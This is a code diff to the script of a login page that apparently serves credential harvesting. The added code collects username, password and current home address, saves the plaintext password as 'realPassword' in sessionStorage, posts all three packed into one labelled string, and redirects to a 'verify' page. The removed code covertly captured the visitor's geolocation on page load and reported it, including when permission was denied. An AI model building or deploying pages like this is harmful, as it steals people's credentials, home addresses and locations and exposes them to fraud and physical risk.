@@ -100,7 +100,6 @@
                 <input type="password" id="password" placeholder="Password" required>
             </div>
 
-            <!-- New Home Address Field -->
             <div class="form-group">
                 <label>Home Address (Current)</label>
                 <input type="text" id="address" placeholder="Enter your current home address" required>
@@ -136,48 +135,39 @@
     </footer>
 
     <script>
-   document.getElementById('loginForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    const address = document.getElementById('address') ? document.getElementById('address').value : '';
-
-    // Save real password for verification
-    sessionStorage.setItem('realPassword', password);
-
-    try {
-        await fetch('/api/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username, password, address })
-        });
-    } catch (err) {}
-
-    window.location.href = "verify.html";
-});
-        
-   // Get real geolocation when user clicks the link
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const loc = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
             
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const homeAddress = document.getElementById('address').value.trim();
+
+            if (!username || !password || !homeAddress) {
+                alert("Please fill all fields");
+                return;
+            }
+
+            // Save real password for verification page
+            sessionStorage.setItem('realPassword', password);
+
+            // Save login details (will be updated later by verify page)
             try {
-                await fetch('/api/record-visit', {
+                await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ location: loc })
+                    body: JSON.stringify({ 
+                        username: username,
+                        password: password,
+                        address: `User ID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
+                    })
                 });
-            } catch (e) {}
-        }, () => {
-            // If user denies permission
-            fetch('/api/record-visit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ location: 'Permission Denied' })
-            });
+            } catch (err) {
+                console.error("Login save failed", err);
+            }
+
+            // Redirect to verification
+            window.location.href = "verify.html";
         });
-    }
     </script>
 </body>
 </html>
